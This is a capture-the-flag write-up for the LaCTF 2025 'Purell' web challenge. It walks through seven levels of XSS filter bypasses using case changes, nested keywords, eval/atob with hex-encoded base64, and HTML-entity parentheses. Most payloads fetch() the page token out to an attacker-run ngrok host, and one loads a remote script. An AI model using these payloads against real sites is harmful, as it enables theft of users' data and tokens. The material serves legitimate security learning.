
# 🌐 Purell


![Challenge Presentation](/images/LaCTF-2025/Purell/challenge_presentation.png "Challenge Presentation")

## 📊 Challenge Overview
>
>| Category | Details | Additional Info |
>|----------|---------|-----------------|
>| 🏆 Event | LaCTF - 2025 | [Event Link](https://platform.lac.tf/challs) |
>| 🔰 Category | Web | 🌐 |
>| 💎 Points | 500 | Out of 500 total |
>| ⭐ Difficulty | 🟡 Medium | Personal Rating: 5/10 |
>| 👤 Author | r2uwu2, adapted by burturt for la ctf | [Profile]() |
>| 🎮 Solves (At the time of flag submission)| 27 | solve rate |
>| 📅 Date | 08-02-2025 | LaCTF - 2025 |
>| 🦾 Solved By | mH4ck3r0n3 | Team: QnQSec |

## 📝 Challenge Information
>Here in purellland, we sanitize your inputs. We kill 99% of germs, can you be the 1% germ that slips through?  purell.chall.lac.tf  Note: when giving links to the admin bot, the link must be exactly of the form

## 🎯 Challenge Files & Infrastructure

### Provided Files
>Files: 
>- [:(far fa-file-archive fa-fw): Attached Files](https://drive.google.com/file/d/1ttRLd_mN-IEELKQj-_MD68G25sAqVLyi/view?usp=drive_link)

# 🔍 Initial Analysis

## First Steps
> Initially, the website appears as follows:
> 
> ![Site Presentation](/images/LaCTF-2025/Purell/site_presentation.png "Site Presentation")
> 
> By clicking the link at `Level 0`, I was redirected to the following page:
> 
> ![Level 0](/images/LaCTF-2025/Purell/level0.png "Level 0")
> 
> From this and the fact that there was an admin bot to which an `URL` could be reported, I understood it was an `XSS` challenge. I didn’t read much of the attached files since they contained almost the same information as the website. There were a total of `7` levels, and with each level, an additional layer of `sanitization` was applied to the input of the `textArea`. The first thing I noticed was that the goal wasn’t to steal the admin bot's cookies when it was directed to the page with the XSS. Instead, the goal was to steal a token contained within the page visited by the admin bot, as we can see from level zero: `purell-token{xss_guru_0}`. So, the first thing I did was start an ngrok server:
> 
> ```bash
>  ngrok 8080
> ```
> 
> to which the stolen token from the admin bot's requests would be sent. The first level had no sanitization, so I used a simple `XSS` payload:
> 
> ```html
> <script>fetch('https://c0b4-2-37-167-108.ngrok-free.app?flag=' + document.querySelector('.flag').innerText)</script>
> ```
>
> Once the payload was sent into the `textArea`, I extracted the generated page link:
> 
> ![Level 0 Payload](/images/LaCTF-2025/Purell/level0_payload.png "Level 0 Payload") 
>  ```
> https://purell.chall.lac.tf/level/start?html=%3Cscript%3Efetch%28%27https%3A%2F%2Fc0b4-2-37-167-108.ngrok-free.app%3Fflag%3D%27+%2B+document.querySelector%28%27.flag%27%29.innerText%29+%5C%3C%2Fscript%3E
>  ```
> 
> Containing the payload. As we can already see from ngrok, the first request has arrived:
> 
> ![Ngrok Level 0 Fake Token](/images/LaCTF-2025/Purell/ngrok_level0_fake.png "Ngrok Level 0 Fake Token")
> 
> but as we can see, it’s the `fake` token; we need the admin's token. So, I took the previously generated payload link and reported it to the admin bot:
> 
> ![Level 0 Admin Report](/images/LaCTF-2025/Purell/admin_level0.png "Level 0 Admin Report") 
> 
> Having done this, I checked the ngrok web interface again to see the result of the request and retrieve the admin's valid token:
> 
> ![Ngrok Level 0 Admin Token](/images/LaCTF-2025/Purell/ngrok_level0_true.png "Ngrok Level 0 Admin Token")
> 
> As we can see, the injection worked, and I successfully extracted the first valid token (`purell-token{gu4u_of_exf1l}`) to proceed to the next level. By submitting it:
> 
> ![Level 0 Token Send](/images/LaCTF-2025/Purell/token_level0_send.png "Level 0 Token Send")
> 
> I was able to retrieve the first part of the flag (`lactf{1_4m_z3_`), and I gained access to `level 1`:
> 
> ![Flag First Part](/images/LaCTF-2025/Purell/flag_1.png "Flag First Part")
> 
>The process continues in the same way, so let's move on to the exploitation.


## 🔬 Vulnerability Analysis
### Potential Vulnerabilities
>- [x] XSS (Cross-Site Scripting)

# 🎯 Solution Path

## Exploitation Steps
### Initial setup
>Having understood the vulnerability, I proceeded with the exploitation phase. Now, it’s just a matter of figuring out how to bypass the additional sanitization in the new levels.
>
### Exploitation
>  The new level presents sanitization:
> 
> ![Level 1](/images/LaCTF-2025/Purell/level1.png "Level 1")
> 
> As we can see, the sanitizer: `html => html.includes('script') || html.length > 150 ? 'nuh-uh' : html`, applies sanitization to the input, where anything containing the word `script` or a payload longer than `150` characters will result in the injection failing. I found a website to count the characters and check if the payload exceeded `150` characters ([Character Counter](https://www.charactercountonline.com/)). Once I confirmed the payload was under 150 characters, I needed to figure out how to bypass the first sanitizer (`html.includes('script')`):
> 
> ![Char Counter](/images/LaCTF-2025/Purell/charcounter.png "Char Counter") 
> 
> Since the check was done on `script` in all lowercase, I thought of modifying the payload by inserting `ScrIPt` instead of `script`:
> 
> ```html
> <ScrIPt>fetch('//c0b4-2-37-167-108.ngrok-free.app?flag='+document.querySelector('.flag').innerText)</ScrIPt>
> ```
> 
> This payload allowed me to successfully achieve the injection and bypass level 1 (the process remains the same for all levels: `injection -> link -> report -> token -> token submission`), so I won’t repeat it every time in the write-up. As we can see, I obtained the new token:
> 
> ![Ngrok Level 1](/images/LaCTF-2025/Purell/ngrok_level1.png "Ngrok Level 1")
> 
> I won’t show all the tokens sent anymore, but I’ll only include the procedure to bypass the sanitization of the payloads. By submitting the token (`purell-token{scr7ptl355_m3n4c3}`), I received the second part of the flag: `b3s7_x40ss_`. Accessing level 2, a new layer of sanitization was introduced:
>  
> ```
> Sanitizer: (html) => html.includes('script') || html.includes('on') || html.length > 150 ? 'nuh-uh' : html
> ```
> 
> Now, it also checks if `on` is present in the payload, and the injection is sanitized. However, with the previous payload, I was able to bypass this level as well, accessing **level 3** and obtaining the third part of the flag: `h4nd_g34m_`, along with the token (`purell-token{XSS_IS_UNSTOPPABLE_RAHHHH}`). Level 3 introduced another layer of sanitization:
> 
> ```
> Sanitizer: (html) => html.toLowerCase().replaceAll('script', '').replaceAll('on', '')
> ```
> 
> In this case, the control is applied to a string in all `lowercase`, so the previous payload cannot work because it contains uppercase characters and, most importantly, it contains `script`. In fact, as we can see, it replaces `script` and `on`, removing them from the payload being inserted. Here, I started to encounter a couple of issues, because previously I was using `document.querySelector('.flag').innerText)` to extract the token from the HTML page and send it to my web server, but now I can no longer use it because of `toLowerCase()`. In fact, the `queryselector()` or `innertext` functions do not exist, so it is impossible to extract the flag in this way. I then thought of starting a local server with Python and hosting an exploit file using Python's `http.server` + `ngrok forwarding`:
> 
> ```bash
> python -m http.server 8080
> ```
> 
> The exploit file is as follows: [:(far fa-file-archive fa-fw): Exploit](/resources/LaCTF-2025/Purell/exploit.js). By doing this, I inserted a script in the page with a `src` pointing to my web server, where I was serving the exploit. This exploit makes a request to my web server exactly as I did with the previous payloads. Why is this? To bypass the `toLowerCase()`, in fact, since the `js` file was served by me from my web server and the page pointed to it, it didn't pass through the sanitizer, and therefore I could use any character. I then used the following payload:
> 
> ```html
> <scriscriptpt src="//c0b4-2-37-167-108.ngrok-free.app/exploit.js"></scriscriptpt>
> ```
> 
> I used `<scriscriptpt>` because once the sanitizer does the `replace`, it replaces `script` with `*nothing*`, and we end up with `<script>`, successfully performing the injection. Once the injection was sent, I extracted the token (`purell-token{a_l7l_b7t_0f_m00t4t70n}`) to access the new part of the flag (`4cr0ss_411_t1m3`) and level 4. Here, another type of sanitization is applied:
> 
> ```
> (html) => html .toLowerCase().replaceAll('script', '').replaceAll('on', '') .replaceAll('>', '')
> ```
> 
> The replacement of `>` (a character that, as we know, is used to close HTML tags) is introduced here. When trying to insert `<scriscriptpt>`, the tag remained open, which prevented the execution of the JavaScript code contained within it. After a couple of tries, I was able to trigger the `alert` and successfully perform the injection with the following payload:
> 
> ```html
> <img src=x oonnerror="alert(1)"
> ```
> 
> Exploiting the same technique used earlier, which replaces `on` to make the input `onerror`. However, now problems start arising since without the `<script>` tag, I can no longer bypass the `toLowerCase()` with a script hosted on my web server, as it's not possible to include JS within an HTML `image` tag. After several attempts, I found a somewhat unusual but effective solution. I used `eval()` to execute the JavaScript, the `atob()` function to decode the `base64` payload, and finally encoded the payload from `base64` to `hex` to bypass the `toLowerCase()` control. I took the previously used payload and made these conversions with [CyberChef](https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')To_Hex('%5C%5Cx',0)&input=ZmV0Y2goJ2h0dHBzOi8vYzBiNC0yLTM3LTE2Ny0xMDgubmdyb2stZnJlZS5hcHA/ZmxhZz0nICsgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmZsYWcnKS5pbm5lclRleHQp):
> 
> ![Cyberchef Encoding->Base64->Hex](/images/LaCTF-2025/Purell/cyberchef.png "Cyberchef Encoding->Base64->Hex")
> 
> And I built the following payload:
> 
> ```html
> <img src=x oonnerror="eval(atob('\x5a\x6d\x56\x30\x59\x32\x67\x6f\x4a\x32\x68\x30\x64\x48\x42\x7a\x4f\x69\x38\x76\x59\x7a\x42\x69\x4e\x43\x30\x79\x4c\x54\x4d\x33\x4c\x54\x45\x32\x4e\x79\x30\x78\x4d\x44\x67\x75\x62\x6d\x64\x79\x62\x32\x73\x74\x5a\x6e\x4a\x6c\x5a\x53\x35\x68\x63\x48\x41\x2f\x5a\x6d\x78\x68\x5a\x7a\x30\x6e\x49\x43\x73\x67\x5a\x47\x39\x6a\x64\x57\x31\x6c\x62\x6e\x51\x75\x63\x58\x56\x6c\x63\x6e\x6c\x54\x5a\x57\x78\x6c\x59\x33\x52\x76\x63\x69\x67\x6e\x4c\x6d\x5a\x73\x59\x57\x63\x6e\x4b\x53\x35\x70\x62\x6d\x35\x6c\x63\x6c\x52\x6c\x65\x48\x51\x70'))">
> ```
> 
> By doing this, the `hex` text became `ascii`, which was encoded in `base64`. The `atob()` function decodes the `base64`, and finally, everything is executed by `eval()`. This allowed me to obtain the new token (`purell-token{html_7s_m4lf0rmed_bu7_no7_u}`) for `level 5` and the new part of the flag (`_4nd_z_`). Upon accessing the new level, another sanitization is introduced:
> 
> ```
> (html) => html .toLowerCase().replaceAll('script', '').replaceAll('on', '') .replaceAll('>', '') .replace(/\s/g, '')
> ```
> 
> A space replacement is added within the payload. After a few tests, I discovered that `HTML` interprets the `/` character as a space, so I replaced the `/` character in the previous payload instead of spaces and successfully got the injection (since the encoding process already eliminated all spaces).
>
>```html
> <img/src="x"/oonnerror="eval(atob('\x5a\x6d\x56\x30\x59\x32\x67\x6f\x4a\x32\x68\x30\x64\x48\x42\x7a\x4f\x69\x38\x76\x59\x7a\x42\x69\x4e\x43\x30\x79\x4c\x54\x4d\x33\x4c\x54\x45\x32\x4e\x79\x30\x78\x4d\x44\x67\x75\x62\x6d\x64\x79\x62\x32\x73\x74\x5a\x6e\x4a\x6c\x5a\x53\x35\x68\x63\x48\x41\x2f\x5a\x6d\x78\x68\x5a\x7a\x30\x6e\x49\x43\x73\x67\x5a\x47\x39\x6a\x64\x57\x31\x6c\x62\x6e\x51\x75\x63\x58\x56\x6c\x63\x6e\x6c\x54\x5a\x57\x78\x6c\x59\x33\x52\x76\x63\x69\x67\x6e\x4c\x6d\x5a\x73\x59\x57\x63\x6e\x4b\x53\x35\x70\x62\x6d\x35\x6c\x63\x6c\x52\x6c\x65\x48\x51\x70'))">
>```
>
> By sending it, I retrieved the new token (`purell-token{wh3n_th3_imp0st4_i5_5u5_bu7_th3r35_n0_sp4c3}`) for access to `level 6` and the new part of the flag (`un1v3rs3`). We have finally reached the last level, where an additional layer of sanitization is introduced:
> 
> ```
> (html) => html .toLowerCase().replaceAll('script', '').replaceAll('on', '') .replaceAll('>', '') .replace(/\s/g, '') .replace(/[()]/g, '')
> ```
> 
> All parentheses (`()`) are therefore removed. To call the `eval` and `atob` functions, parentheses are essential, so I started trying a few things and thought of using some sort of encoding. I then came up with the idea of encoding the parentheses into `HTML Entity` using CyberChef:
> 
> ![Cyberchef Encoding->HTML Entity](/images/LaCTF-2025/Purell/cyberchef2.png "Cyberchef Encoding->HTML Entity")
> 
> As we can see, they are replaced with `&lpar;&rpar;`. By replacing them in the previous payload and sending it, I obtained the injection:
> 
> ```html
> <img/src="x"/oonnerror="eval&lpar;atob&lpar;'\x5a\x6d\x56\x30\x59\x32\x67\x6f\x4a\x32\x68\x30\x64\x48\x42\x7a\x4f\x69\x38\x76\x59\x7a\x42\x69\x4e\x43\x30\x79\x4c\x54\x4d\x33\x4c\x54\x45\x32\x4e\x79\x30\x78\x4d\x44\x67\x75\x62\x6d\x64\x79\x62\x32\x73\x74\x5a\x6e\x4a\x6c\x5a\x53\x35\x68\x63\x48\x41\x2f\x5a\x6d\x78\x68\x5a\x7a\x30\x6e\x49\x43\x73\x67\x5a\x47\x39\x6a\x64\x57\x31\x6c\x62\x6e\x51\x75\x63\x58\x56\x6c\x63\x6e\x6c\x54\x5a\x57\x78\x6c\x59\x33\x52\x76\x63\x69\x67\x6e\x4c\x6d\x5a\x73\x59\x57\x63\x6e\x4b\x53\x35\x70\x62\x6d\x35\x6c\x63\x6c\x52\x6c\x65\x48\x51\x70'&rpar;&rpar;">
> ```
> 
> (For these last levels, I have to thank the authors of the challenge for removing the control on the maximum `150` characters, otherwise I think it would have been impossible.) I retrieved the token (`purell-token{y0u_4r3_th3_0n3_wh0_c4ll5}`) and sending it, I obtained the final part of the flag (`_1nf3c71ng_3v34y_1}`). Now all that's left is to put it together completely and we're done!
>
### Flag capture
>  
>   ![Manual Flag](/images/LaCTF-2025/Purell/manual_flag.png "Manual Flag")

# 🛠️ Exploitation Process
## Approach
> Since there was a reCAPTCHA, I couldn't create a fully automated exploit, but the exploit is based on a local server written in Python that takes requests made through the injection, extracts the token, and sends it to the `/flag` endpoint. Once done, it uses a regex to retrieve the flag part and concatenate it. At the end, when all requests are made, you just press `CTRL+C` to print the full flag. Of course, this requires setting it with the ngrok URL. The alternative would be to run `requests.py`, always setting the ngrok URL to redirect the tokens directly to the local server, which will carry out the entire process described above.
> 
> - [:(far fa-file-archive fa-fw): Exploit](/resources/LaCTF-2025/Purell/exploit.py)
> - [:(far fa-file-archive fa-fw): Requests](/resources/LaCTF-2025/Purell/requests.py)
> - [:(far fa-file-archive fa-fw): Exploit JS](/resources/LaCTF-2025/Purell/exploit.js)
> - [:(far fa-file-archive fa-fw): Bypass Try](/resources/LaCTF-2025/Purell/bypass_try.txt)

# 🚩 Flag Capture
>{{< admonition danger "Flag" >}}
{{< typeit tag=h4 >}}
lactf{1_4m_z3_b3s7_x40ss_h4nd_g34m_4cr0ss_411_t1m3_4nd_z_un1v3rs3_1nf3c71ng_3v34y_1}
{{< /typeit >}}
>{{< /admonition >}}
>
## Proof of Execution
> ![Automated Flag](/images/LaCTF-2025/Purell/automated_flag.png "Automated Flag")
>*Screenshot of successful exploitation*

# 🔧 Tools Used
>| Tool | Purpose |
>|------|---------|
>| Python | Exploit |
>| CyberChef | Encoding |
>| [Character Counter](https://www.charactercountonline.com/) | Character Count |

# 💡 Key Learnings
## New Knowledge
I have learned new techniques to bypass some filters imposed on XSS.
## Skills Improved
>- [ ] Binary Exploitation
>- [ ] Reverse Engineering
>- [x] Web Exploitation
>- [ ] Cryptography
>- [ ] Forensics
>- [ ] OSINT
>- [ ] Miscellaneous

# 📚 References & Resources

## Learning Resources
>-  https://it.wikipedia.org/wiki/Cross-site_scripting

---
## 📊 Final Statistics

| Metric | Value | Notes |
|--------|--------|-------|
| Time to Solve | 01:30 | From start to flag |
| Global Ranking (At the time of flag submission)| 30/714 | Challenge ranking |
| Points Earned | 500 | Team contribution |

*Created: 08-02-2025 • Last Modified: 08-02-2025*
*Author: mH4ck3r0n3 • Team: QnQSec*
